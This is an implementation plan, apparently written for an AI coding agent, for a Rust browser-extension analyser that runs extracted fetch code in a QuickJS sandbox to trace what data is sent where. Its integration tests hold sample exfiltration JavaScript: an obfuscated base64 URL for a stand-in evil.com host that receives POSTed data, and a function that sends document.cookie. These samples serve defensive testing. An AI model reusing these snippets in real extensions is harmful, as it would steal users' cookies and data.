# Sandbox-Enhanced Endpoint Analysis - Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Run suspicious code snippets in the sandbox to trace actual data being sent to network endpoints.

**Architecture:** After static analysis identifies endpoints with untracked data sources, extract the enclosing function, run it in the QuickJS sandbox, and attach traced fetch arguments to the endpoint.

**Tech Stack:** Oxc AST (existing), rquickjs sandbox (existing), serde for serialization.

---

## Task 1: Add SandboxTrace Types

**Files:**
- Modify: `src/models/endpoint.rs`

**Step 1: Write tests for SandboxTrace**

Add at the end of `src/models/endpoint.rs`:

```rust
/// A traced fetch call from sandbox execution
#[derive(Debug, Clone, PartialEq)]
pub struct TracedFetch {
    /// The URL that was called
    pub url: String,
    /// HTTP method if specified
    pub method: Option<String>,
    /// Body content (serialized)
    pub body: Option<String>,
}

/// Results from running code in the sandbox
#[derive(Debug, Clone, Default)]
pub struct SandboxTrace {
    /// Fetch calls that were traced
    pub fetch_calls: Vec<TracedFetch>,
    /// Strings that were decoded (atob, fromCharCode results)
    pub decoded_strings: Vec<String>,
    /// Whether execution was partial (error/timeout)
    pub partial: bool,
    /// Error message if any
    pub error: Option<String>,
}

impl SandboxTrace {
    pub fn is_empty(&self) -> bool {
        self.fetch_calls.is_empty() && self.decoded_strings.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sandbox_trace_default_is_empty() {
        let trace = SandboxTrace::default();
        assert!(trace.is_empty());
        assert!(!trace.partial);
        assert!(trace.error.is_none());
    }

    #[test]
    fn test_sandbox_trace_with_fetch_not_empty() {
        let trace = SandboxTrace {
            fetch_calls: vec![TracedFetch {
                url: "https://example.com".to_string(),
                method: Some("POST".to_string()),
                body: Some(r#"{"key":"value"}"#.to_string()),
            }],
            ..Default::default()
        };
        assert!(!trace.is_empty());
    }

    #[test]
    fn test_sandbox_trace_with_decoded_not_empty() {
        let trace = SandboxTrace {
            decoded_strings: vec!["https://evil.com".to_string()],
            ..Default::default()
        };
        assert!(!trace.is_empty());
    }
}
```

**Step 2: Run tests**

Run:
```bash
cargo test --lib endpoint::tests
```

Expected: 3 new tests pass

**Step 3: Add sandbox_trace field to Endpoint**

In `src/models/endpoint.rs`, modify the `Endpoint` struct (around line 121):

```rust
#[derive(Debug, Clone)]
pub struct Endpoint {
    pub url: String,
    pub method: Option<HttpMethod>,
    pub data_sources: Vec<DataSource>,
    pub location: Location,
    pub context: EndpointContext,
    pub description: Option<String>,
    pub flags: Vec<EndpointFlag>,
    pub sandbox_trace: Option<SandboxTrace>,
}
```

**Step 4: Update Endpoint::new**

Modify the `new` function (around line 132):

```rust
impl Endpoint {
    pub fn new(url: String, location: Location) -> Self {
        Self {
            url,
            method: None,
            data_sources: Vec::new(),
            location,
            context: EndpointContext::Unknown,
            description: None,
            flags: Vec::new(),
            sandbox_trace: None,
        }
    }
```

**Step 5: Add builder method**

Add after `with_flag` method:

```rust
    pub fn with_sandbox_trace(mut self, trace: SandboxTrace) -> Self {
        self.sandbox_trace = Some(trace);
        self
    }
```

**Step 6: Run all tests**

Run:
```bash
cargo test
```

Expected: All tests pass

**Step 7: Commit**

```bash
git add src/models/endpoint.rs
git commit -m "feat(models): add SandboxTrace types for endpoint analysis"
```

---

## Task 2: Create Code Extractor Module

**Files:**
- Create: `src/analyze/code_extractor.rs`
- Modify: `src/analyze/mod.rs`

**Step 1: Create the module with tests**

Create `src/analyze/code_extractor.rs`:

```rust
//! Extract runnable code snippets around fetch calls for sandbox execution

use oxc_allocator::Allocator;
use oxc_ast::ast::*;
use oxc_ast::visit::walk;
use oxc_ast::Visit;
use oxc_parser::Parser;
use oxc_span::SourceType;
use std::path::Path;

/// Extracted code context for sandbox execution
#[derive(Debug, Clone)]
pub struct ExtractedSnippet {
    /// The runnable code
    pub code: String,
    /// Line number of the fetch call
    pub fetch_line: usize,
    /// URL being fetched (if statically known)
    pub fetch_url: Option<String>,
}

/// Extract code snippets containing fetch calls from JavaScript source
pub fn extract_fetch_snippets(source: &str, _file_path: &Path) -> Vec<ExtractedSnippet> {
    let allocator = Allocator::default();
    let source_type = SourceType::from_path(Path::new("file.js")).unwrap_or_default();
    let parser = Parser::new(&allocator, source, source_type);
    let parsed = parser.parse();

    if parsed.errors.is_empty() {
        let mut extractor = SnippetExtractor::new(source);
        extractor.visit_program(&parsed.program);
        extractor.snippets
    } else {
        Vec::new()
    }
}

struct SnippetExtractor<'a> {
    source: &'a str,
    snippets: Vec<ExtractedSnippet>,
    current_function_span: Option<oxc_span::Span>,
}

impl<'a> SnippetExtractor<'a> {
    fn new(source: &'a str) -> Self {
        Self {
            source,
            snippets: Vec::new(),
            current_function_span: None,
        }
    }

    fn line_from_offset(&self, offset: u32) -> usize {
        self.source[..(offset as usize).min(self.source.len())]
            .chars()
            .filter(|&c| c == '\n')
            .count()
            + 1
    }

    fn extract_snippet(&self, span: oxc_span::Span) -> String {
        let start = span.start as usize;
        let end = (span.end as usize).min(self.source.len());
        self.source[start..end].to_string()
    }

    fn get_fetch_url(&self, call: &CallExpression<'_>) -> Option<String> {
        if let Some(first_arg) = call.arguments.first() {
            match first_arg {
                Argument::StringLiteral(lit) => Some(lit.value.to_string()),
                Argument::TemplateLiteral(tmpl) => {
                    tmpl.quasis.first().map(|q| q.value.raw.to_string())
                }
                _ => None,
            }
        } else {
            None
        }
    }

    fn is_fetch_call(&self, call: &CallExpression<'_>) -> bool {
        match &call.callee {
            Expression::Identifier(ident) => ident.name == "fetch",
            _ => false,
        }
    }
}

impl<'a> Visit<'a> for SnippetExtractor<'a> {
    fn visit_function(&mut self, func: &Function<'a>, _flags: oxc_semantic::ScopeFlags) {
        let prev_span = self.current_function_span;
        if let Some(body) = &func.body {
            self.current_function_span = Some(body.span);
        }
        walk::walk_function(self, func);
        self.current_function_span = prev_span;
    }

    fn visit_arrow_function_expression(&mut self, arrow: &ArrowFunctionExpression<'a>) {
        let prev_span = self.current_function_span;
        self.current_function_span = Some(arrow.span);
        walk::walk_arrow_function_expression(self, arrow);
        self.current_function_span = prev_span;
    }

    fn visit_call_expression(&mut self, call: &CallExpression<'a>) {
        if self.is_fetch_call(call) {
            let fetch_line = self.line_from_offset(call.span.start);
            let fetch_url = self.get_fetch_url(call);

            // Use enclosing function if available, otherwise use surrounding context
            let code = if let Some(func_span) = self.current_function_span {
                self.extract_snippet(func_span)
            } else {
                // No enclosing function - extract ~20 lines around the call
                let start_line = fetch_line.saturating_sub(10);
                let lines: Vec<&str> = self.source.lines().collect();
                let end_line = (fetch_line + 10).min(lines.len());
                lines[start_line..end_line].join("\n")
            };

            // Skip if code is too long (likely minified/bundled)
            if code.len() <= 5000 {
                self.snippets.push(ExtractedSnippet {
                    code,
                    fetch_line,
                    fetch_url,
                });
            }
        }
        walk::walk_call_expression(self, call);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_extract_fetch_in_function() {
        let code = r#"
function sendData(data) {
    fetch("https://api.example.com/submit", {
        method: "POST",
        body: JSON.stringify(data)
    });
}
"#;
        let snippets = extract_fetch_snippets(code, &PathBuf::from("test.js"));
        assert_eq!(snippets.len(), 1);
        assert!(snippets[0].code.contains("sendData"));
        assert!(snippets[0].code.contains("fetch"));
        assert_eq!(snippets[0].fetch_url, Some("https://api.example.com/submit".to_string()));
    }

    #[test]
    fn test_extract_fetch_in_arrow_function() {
        let code = r#"
const submit = async (payload) => {
    await fetch("https://api.example.com/data", {
        method: "POST",
        body: payload
    });
};
"#;
        let snippets = extract_fetch_snippets(code, &PathBuf::from("test.js"));
        assert_eq!(snippets.len(), 1);
        assert!(snippets[0].code.contains("payload"));
    }

    #[test]
    fn test_extract_multiple_fetches() {
        let code = r#"
function first() { fetch("https://a.com"); }
function second() { fetch("https://b.com"); }
"#;
        let snippets = extract_fetch_snippets(code, &PathBuf::from("test.js"));
        assert_eq!(snippets.len(), 2);
    }

    #[test]
    fn test_skip_very_long_functions() {
        // Create a function with >5000 chars
        let long_body = "x".repeat(5100);
        let code = format!(r#"function big() {{ let x = "{}"; fetch("https://a.com"); }}"#, long_body);
        let snippets = extract_fetch_snippets(&code, &PathBuf::from("test.js"));
        assert!(snippets.is_empty());
    }

    #[test]
    fn test_top_level_fetch_uses_context() {
        let code = r#"
const url = "https://api.example.com";
fetch(url);
console.log("done");
"#;
        let snippets = extract_fetch_snippets(code, &PathBuf::from("test.js"));
        assert_eq!(snippets.len(), 1);
        // Should capture surrounding lines
        assert!(snippets[0].code.contains("const url"));
    }
}
```

**Step 2: Register the module**

Add to `src/analyze/mod.rs` after line 4:

```rust
pub mod code_extractor;
```

**Step 3: Run tests**

Run:
```bash
cargo test code_extractor
```

Expected: 5 tests pass

**Step 4: Commit**

```bash
git add src/analyze/code_extractor.rs src/analyze/mod.rs
git commit -m "feat(analyze): add code extractor for fetch snippets"
```

---

## Task 3: Create Sandbox Analysis Module

**Files:**
- Create: `src/analyze/sandbox_analysis.rs`
- Modify: `src/analyze/mod.rs`

**Step 1: Create the module**

Create `src/analyze/sandbox_analysis.rs`:

```rust
//! Run extracted code snippets in sandbox to trace actual fetch arguments

use crate::models::{DataSource, Endpoint, ExtensionFile, FileType, SandboxTrace, TracedFetch};
use crate::sandbox::{execute_snippet, ApiCall, SandboxResult};
use std::collections::HashMap;

use super::code_extractor::{extract_fetch_snippets, ExtractedSnippet};

/// Configuration for sandbox analysis
pub struct SandboxAnalysisConfig {
    /// Max endpoints to analyze (to limit runtime)
    pub max_endpoints: usize,
    /// Timeout per snippet in milliseconds
    pub timeout_ms: u64,
    /// Max file size to analyze (skip large/minified files)
    pub max_file_size: usize,
}

impl Default for SandboxAnalysisConfig {
    fn default() -> Self {
        Self {
            max_endpoints: 20,
            timeout_ms: 2000,
            max_file_size: 50_000,
        }
    }
}

/// Analyze endpoints by running their code context in the sandbox
pub fn analyze_endpoints_with_sandbox(
    endpoints: &mut [Endpoint],
    files: &[ExtensionFile],
    config: &SandboxAnalysisConfig,
) {
    // Build a map of file path -> content for quick lookup
    let file_contents: HashMap<_, _> = files
        .iter()
        .filter_map(|f| {
            if matches!(f.file_type, FileType::JavaScript)
                && f.content.as_ref().map(|c| c.len()).unwrap_or(0) <= config.max_file_size
            {
                f.content.as_ref().map(|c| (f.path.clone(), c.clone()))
            } else {
                None
            }
        })
        .collect();

    // Find endpoints with Unknown data sources (candidates for sandbox)
    let mut analyzed = 0;
    for endpoint in endpoints.iter_mut() {
        if analyzed >= config.max_endpoints {
            break;
        }

        // Only analyze endpoints with Unknown sources
        let has_unknown = endpoint
            .data_sources
            .iter()
            .any(|s| matches!(s, DataSource::Unknown(_)));

        if !has_unknown {
            continue;
        }

        // Get the file content
        let Some(content) = file_contents.get(&endpoint.location.file) else {
            continue;
        };

        // Extract snippets from this file
        let snippets = extract_fetch_snippets(content, &endpoint.location.file);

        // Find snippet matching this endpoint's line
        let matching_snippet = snippets.iter().find(|s| {
            // Match by URL if available, otherwise by line proximity
            if let Some(ref url) = s.fetch_url {
                url == &endpoint.url
            } else if let Some(line) = endpoint.location.line {
                (s.fetch_line as i32 - line as i32).abs() <= 5
            } else {
                false
            }
        });

        if let Some(snippet) = matching_snippet {
            let trace = run_snippet_in_sandbox(snippet, config.timeout_ms);
            if !trace.is_empty() || trace.error.is_some() {
                endpoint.sandbox_trace = Some(trace);
                analyzed += 1;
            }
        }
    }
}

/// Run a snippet in the sandbox and convert results to SandboxTrace
fn run_snippet_in_sandbox(snippet: &ExtractedSnippet, timeout_ms: u64) -> SandboxTrace {
    // Add a function call if the snippet looks like a function definition
    let code_to_run = maybe_add_invocation(&snippet.code);

    let result = execute_snippet(&code_to_run, timeout_ms);

    convert_sandbox_result(result)
}

/// If the code is a function definition, add a call to invoke it
fn maybe_add_invocation(code: &str) -> String {
    let code = code.trim();

    // Check for function declaration: function name(...)
    if code.starts_with("function ") {
        if let Some(name_end) = code.find('(') {
            let name = code[9..name_end].trim();
            if !name.is_empty() {
                // Count parameters to generate dummy args
                let params = count_parameters(code);
                let args = generate_dummy_args(params);
                return format!("{}\n{}({});", code, name, args);
            }
        }
    }

    // Check for arrow function assigned to const/let: const name = (...) =>
    if code.starts_with("const ") || code.starts_with("let ") {
        if let Some(eq_pos) = code.find('=') {
            let name = code[4..eq_pos].trim().trim_start_matches("const ").trim_start_matches("let ");
            if code[eq_pos..].contains("=>") {
                let params = count_parameters(code);
                let args = generate_dummy_args(params);
                return format!("{}\n{}({});", code, name, args);
            }
        }
    }

    code.to_string()
}

/// Count function parameters (simple heuristic)
fn count_parameters(code: &str) -> usize {
    if let Some(start) = code.find('(') {
        if let Some(end) = code[start..].find(')') {
            let params = &code[start + 1..start + end];
            if params.trim().is_empty() {
                return 0;
            }
            return params.split(',').count();
        }
    }
    0
}

/// Generate dummy arguments for function invocation
fn generate_dummy_args(count: usize) -> String {
    if count == 0 {
        return String::new();
    }
    (0..count)
        .map(|i| match i % 3 {
            0 => "\"test\"".to_string(),
            1 => "12345".to_string(),
            _ => "{}".to_string(),
        })
        .collect::<Vec<_>>()
        .join(", ")
}

/// Convert SandboxResult to SandboxTrace
fn convert_sandbox_result(result: SandboxResult) -> SandboxTrace {
    let fetch_calls = result
        .api_calls
        .iter()
        .filter(|c| c.function == "fetch")
        .map(|c| {
            let url = c.arguments.first()
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            let (method, body) = if let Some(opts) = c.arguments.get(1) {
                let method = opts.get("method")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let body = opts.get("body")
                    .map(|v| v.to_string());
                (method, body)
            } else {
                (None, None)
            };

            TracedFetch { url, method, body }
        })
        .collect();

    let decoded_strings = result
        .decoded_strings
        .iter()
        .map(|d| d.output.clone())
        .collect();

    SandboxTrace {
        fetch_calls,
        decoded_strings,
        partial: result.error.is_some(),
        error: result.error,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_maybe_add_invocation_function() {
        let code = "function sendData(x) { fetch(x); }";
        let result = maybe_add_invocation(code);
        assert!(result.contains("sendData(\"test\");"));
    }

    #[test]
    fn test_maybe_add_invocation_arrow() {
        let code = "const submit = (a, b) => { fetch(a); }";
        let result = maybe_add_invocation(code);
        assert!(result.contains("submit(\"test\", 12345);"));
    }

    #[test]
    fn test_maybe_add_invocation_no_params() {
        let code = "function getData() { fetch('/api'); }";
        let result = maybe_add_invocation(code);
        assert!(result.contains("getData();"));
    }

    #[test]
    fn test_count_parameters() {
        assert_eq!(count_parameters("function f() {}"), 0);
        assert_eq!(count_parameters("function f(a) {}"), 1);
        assert_eq!(count_parameters("function f(a, b, c) {}"), 3);
    }

    #[test]
    fn test_generate_dummy_args() {
        assert_eq!(generate_dummy_args(0), "");
        assert_eq!(generate_dummy_args(1), "\"test\"");
        assert_eq!(generate_dummy_args(2), "\"test\", 12345");
        assert_eq!(generate_dummy_args(3), "\"test\", 12345, {}");
    }

    #[test]
    fn test_convert_sandbox_result_empty() {
        let result = SandboxResult::default();
        let trace = convert_sandbox_result(result);
        assert!(trace.is_empty());
        assert!(!trace.partial);
    }

    #[test]
    fn test_convert_sandbox_result_with_fetch() {
        let result = SandboxResult {
            api_calls: vec![ApiCall {
                function: "fetch".to_string(),
                arguments: vec![
                    serde_json::json!("https://api.example.com"),
                    serde_json::json!({"method": "POST", "body": "{\"key\":\"value\"}"}),
                ],
            }],
            ..Default::default()
        };
        let trace = convert_sandbox_result(result);
        assert_eq!(trace.fetch_calls.len(), 1);
        assert_eq!(trace.fetch_calls[0].url, "https://api.example.com");
        assert_eq!(trace.fetch_calls[0].method, Some("POST".to_string()));
    }

    #[test]
    fn test_convert_sandbox_result_with_error() {
        let result = SandboxResult::with_error("Timeout");
        let trace = convert_sandbox_result(result);
        assert!(trace.partial);
        assert_eq!(trace.error, Some("Timeout".to_string()));
    }
}
```

**Step 2: Register the module**

Update `src/analyze/mod.rs`, add after the other module declarations:

```rust
pub mod sandbox_analysis;
```

**Step 3: Run tests**

Run:
```bash
cargo test sandbox_analysis
```

Expected: 8 tests pass

**Step 4: Commit**

```bash
git add src/analyze/sandbox_analysis.rs src/analyze/mod.rs
git commit -m "feat(analyze): add sandbox analysis for endpoint tracing"
```

---

## Task 4: Integrate Sandbox Analysis into Pipeline

**Files:**
- Modify: `src/analyze/mod.rs`

**Step 1: Update analyze_extension function**

Replace the `analyze_extension` function in `src/analyze/mod.rs`:

```rust
pub async fn analyze_extension(extension: &Extension) -> Result<AnalysisResult> {
    let mut findings = Vec::new();
    let mut endpoints = Vec::new();

    // Analyze manifest permissions
    if let Some(ref manifest) = extension.manifest {
        findings.extend(manifest::analyze_permissions(manifest));
    }

    // Analyze JavaScript files
    for file in &extension.files {
        if let crate::models::FileType::JavaScript = file.file_type
            && let Some(ref content) = file.content
        {
            let (js_findings, js_endpoints) = javascript::analyze_javascript(content, &file.path);
            findings.extend(js_findings);
            endpoints.extend(js_endpoints);

            // Also run dark pattern analysis
            let dp_findings = dark_patterns::analyze_dark_patterns(content, &file.path);
            findings.extend(dp_findings);
        }
    }

    // Run sandbox analysis on endpoints with unknown data sources
    sandbox_analysis::analyze_endpoints_with_sandbox(
        &mut endpoints,
        &extension.files,
        &sandbox_analysis::SandboxAnalysisConfig::default(),
    );

    Ok(AnalysisResult {
        findings,
        endpoints,
        llm_summary: None,
    })
}
```

**Step 2: Run all tests**

Run:
```bash
cargo test
```

Expected: All tests pass

**Step 3: Commit**

```bash
git add src/analyze/mod.rs
git commit -m "feat(analyze): integrate sandbox analysis into pipeline"
```

---

## Task 5: Update Terminal Output

**Files:**
- Modify: `src/output/terminal.rs`

**Step 1: Add sandbox trace display**

In `src/output/terminal.rs`, after line 226 (the `Sends:` line), add:

```rust
        // Print sandbox trace if available
        for ep in group {
            if let Some(ref trace) = ep.sandbox_trace {
                // Show traced fetch calls
                for fetch in &trace.fetch_calls {
                    let method = fetch.method.as_deref().unwrap_or("GET");
                    let body_str = fetch.body.as_ref()
                        .map(|b| {
                            let truncated = if b.len() > 100 {
                                format!("{}...", &b[..100])
                            } else {
                                b.clone()
                            };
                            format!(" body={}", truncated)
                        })
                        .unwrap_or_default();
                    println!("        {} {} {}{}",
                        "Traced:".bright_blue(),
                        method.cyan(),
                        fetch.url.bright_white(),
                        body_str.yellow()
                    );
                }

                // Show decoded strings
                for decoded in &trace.decoded_strings {
                    let truncated = if decoded.len() > 80 {
                        format!("{}...", &decoded[..80])
                    } else {
                        decoded.clone()
                    };
                    println!("        {} {}", "Decoded:".bright_blue(), truncated.yellow());
                }

                // Show error if partial
                if let Some(ref err) = trace.error {
                    println!("        {} {}", "Sandbox:".bright_black(), err.bright_black());
                }
            }
        }
```

**Step 2: Build and verify**

Run:
```bash
cargo build
```

Expected: Compiles without errors

**Step 3: Commit**

```bash
git add src/output/terminal.rs
git commit -m "feat(output): display sandbox traces in terminal"
```

---

## Task 6: Update LLM Endpoint Prompt

**Files:**
- Modify: `src/llm/agents.rs`

**Step 1: Enhance build_endpoint_prompt**

Replace the `build_endpoint_prompt` function (around line 267):

```rust
fn build_endpoint_prompt(endpoints: &[Endpoint]) -> String {
    let endpoints_text: String = endpoints
        .iter()
        .take(20) // Limit to avoid token issues
        .map(|e| {
            let mut lines = vec![format!(
                "- {} {} (found at {})",
                e.method.as_ref().map(|m| m.as_str()).unwrap_or("?"),
                e.url,
                e.location
            )];

            // Add static analysis data sources
            if !e.data_sources.is_empty() {
                let sources: Vec<_> = e.data_sources.iter().map(|s| s.to_string()).collect();
                lines.push(format!("  Static analysis: sends {}", sources.join(", ")));
            }

            // Add sandbox trace if available
            if let Some(ref trace) = e.sandbox_trace {
                for fetch in &trace.fetch_calls {
                    let method = fetch.method.as_deref().unwrap_or("GET");
                    let body_info = fetch.body.as_ref()
                        .map(|b| {
                            let truncated = if b.len() > 200 {
                                format!("{}...", &b[..200])
                            } else {
                                b.clone()
                            };
                            format!(", body={}", truncated)
                        })
                        .unwrap_or_default();
                    lines.push(format!("  Sandbox trace: {} {}{}", method, fetch.url, body_info));
                }

                for decoded in &trace.decoded_strings {
                    lines.push(format!("  Decoded string: {}", decoded));
                }

                if trace.partial {
                    if let Some(ref err) = trace.error {
                        lines.push(format!("  (Sandbox partial: {})", err));
                    }
                }
            }

            lines.join("\n")
        })
        .collect::<Vec<_>>()
        .join("\n\n");

    let endpoints_text = if endpoints_text.is_empty() {
        "No endpoints discovered".to_string()
    } else {
        endpoints_text
    };

    format!(
        r#"You are a browser extension security analyst. Analyze these network endpoints discovered in a browser extension.

Endpoints:
{}

Look for:
1. Known malicious domains or IPs
2. Suspicious data collection endpoints (analytics, telemetry that's excessive)
3. Non-HTTPS endpoints that might leak sensitive data
4. Command and control (C2) patterns
5. Unusual API endpoints that don't match the extension's stated purpose
6. Data exfiltration endpoints
7. Sensitive data in request bodies (from sandbox traces)

For each finding, respond in this format:
FINDING: [SEVERITY] - [TITLE]
DESCRIPTION: [Brief description of the security concern with this endpoint]

Severity levels: CRITICAL, HIGH, MEDIUM, LOW, INFO

If no security concerns are found, respond with "NO_FINDINGS"."#,
        endpoints_text
    )
}
```

**Step 2: Run tests**

Run:
```bash
cargo test --lib
```

Expected: All tests pass

**Step 3: Commit**

```bash
git add src/llm/agents.rs
git commit -m "feat(llm): include sandbox traces in endpoint analysis prompt"
```

---

## Task 7: Add Integration Test

**Files:**
- Create: `tests/sandbox_analysis_tests.rs`

**Step 1: Write integration test**

Create `tests/sandbox_analysis_tests.rs`:

```rust
use extanalyzer::analyze::code_extractor::extract_fetch_snippets;
use extanalyzer::analyze::sandbox_analysis::{analyze_endpoints_with_sandbox, SandboxAnalysisConfig};
use extanalyzer::models::{DataSource, Endpoint, ExtensionFile, FileType, HttpMethod, Location};
use std::path::PathBuf;

#[test]
fn test_sandbox_traces_fetch_with_body() {
    let js_code = r#"
function sendUserData(userId, token) {
    fetch("https://api.example.com/collect", {
        method: "POST",
        body: JSON.stringify({ userId: userId, token: token })
    });
}
"#;

    let file_path = PathBuf::from("background.js");
    let files = vec![ExtensionFile {
        path: file_path.clone(),
        file_type: FileType::JavaScript,
        content: Some(js_code.to_string()),
        size: js_code.len() as u64,
    }];

    let mut endpoints = vec![Endpoint::new(
        "https://api.example.com/collect".to_string(),
        Location {
            file: file_path,
            line: Some(3),
            column: None,
        },
    )
    .with_method(HttpMethod::Post)
    .with_data_sources(vec![
        DataSource::Unknown("userId".to_string()),
        DataSource::Unknown("token".to_string()),
    ])];

    analyze_endpoints_with_sandbox(&mut endpoints, &files, &SandboxAnalysisConfig::default());

    assert!(endpoints[0].sandbox_trace.is_some());
    let trace = endpoints[0].sandbox_trace.as_ref().unwrap();
    assert!(!trace.fetch_calls.is_empty());
    assert_eq!(trace.fetch_calls[0].url, "https://api.example.com/collect");
    assert_eq!(trace.fetch_calls[0].method, Some("POST".to_string()));
    // Body should contain the JSON structure
    assert!(trace.fetch_calls[0].body.is_some());
}

#[test]
fn test_sandbox_decodes_obfuscated_url() {
    let js_code = r#"
function exfiltrate(data) {
    var url = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");
    fetch(url, { method: "POST", body: data });
}
"#;

    let file_path = PathBuf::from("content.js");
    let files = vec![ExtensionFile {
        path: file_path.clone(),
        file_type: FileType::JavaScript,
        content: Some(js_code.to_string()),
        size: js_code.len() as u64,
    }];

    // Static analysis might not find the URL, but let's pretend it found a placeholder
    let mut endpoints = vec![Endpoint::new(
        "https://evil.com/steal".to_string(),
        Location {
            file: file_path,
            line: Some(4),
            column: None,
        },
    )
    .with_method(HttpMethod::Post)
    .with_data_sources(vec![DataSource::Unknown("data".to_string())])];

    analyze_endpoints_with_sandbox(&mut endpoints, &files, &SandboxAnalysisConfig::default());

    let trace = endpoints[0].sandbox_trace.as_ref().unwrap();
    // Should have decoded the base64 URL
    assert!(!trace.decoded_strings.is_empty());
    assert!(trace.decoded_strings.iter().any(|s| s.contains("evil.com")));
}

#[test]
fn test_sandbox_skips_endpoints_with_known_sources() {
    let js_code = r#"
function sendCookie() {
    fetch("https://api.example.com/data", {
        body: document.cookie
    });
}
"#;

    let file_path = PathBuf::from("script.js");
    let files = vec![ExtensionFile {
        path: file_path.clone(),
        file_type: FileType::JavaScript,
        content: Some(js_code.to_string()),
        size: js_code.len() as u64,
    }];

    // This endpoint has a known source (Cookie), not Unknown
    let mut endpoints = vec![Endpoint::new(
        "https://api.example.com/data".to_string(),
        Location {
            file: file_path,
            line: Some(3),
            column: None,
        },
    )
    .with_data_sources(vec![DataSource::Cookie(None)])];

    analyze_endpoints_with_sandbox(&mut endpoints, &files, &SandboxAnalysisConfig::default());

    // Should not have sandbox trace since sources are already known
    assert!(endpoints[0].sandbox_trace.is_none());
}

#[test]
fn test_code_extractor_finds_fetch_in_nested_function() {
    let js_code = r#"
(function() {
    function inner() {
        fetch("https://api.test.com/endpoint");
    }
    inner();
})();
"#;

    let snippets = extract_fetch_snippets(js_code, &PathBuf::from("test.js"));
    assert_eq!(snippets.len(), 1);
    assert!(snippets[0].code.contains("inner"));
}
```

**Step 2: Run integration tests**

Run:
```bash
cargo test --test sandbox_analysis_tests
```

Expected: All 4 tests pass

**Step 3: Commit**

```bash
git add tests/sandbox_analysis_tests.rs
git commit -m "test: add integration tests for sandbox endpoint analysis"
```

---

## Task 8: Update Exports

**Files:**
- Modify: `src/lib.rs`

**Step 1: Check current exports**

Read current `src/lib.rs` to see what's exported.

**Step 2: Ensure models are exported**

The `SandboxTrace` and `TracedFetch` types should be accessible. They're in `models::endpoint` which is already public via `models`. Verify with:

```bash
cargo doc --no-deps
```

**Step 3: Commit if changes needed**

```bash
git add src/lib.rs
git commit -m "chore: ensure sandbox types are exported"
```

---

## Summary

After completing all tasks:

1. **New types:** `SandboxTrace`, `TracedFetch` in `models/endpoint.rs`
2. **Code extraction:** `code_extractor.rs` finds enclosing functions around fetch calls
3. **Sandbox execution:** `sandbox_analysis.rs` runs snippets and converts results
4. **Pipeline integration:** `analyze_extension` calls sandbox analysis after static analysis
5. **Terminal output:** Shows `Traced:` and `Decoded:` lines for endpoints
6. **LLM prompt:** Includes sandbox traces for richer analysis

The LLM now sees actual request bodies instead of just variable names.
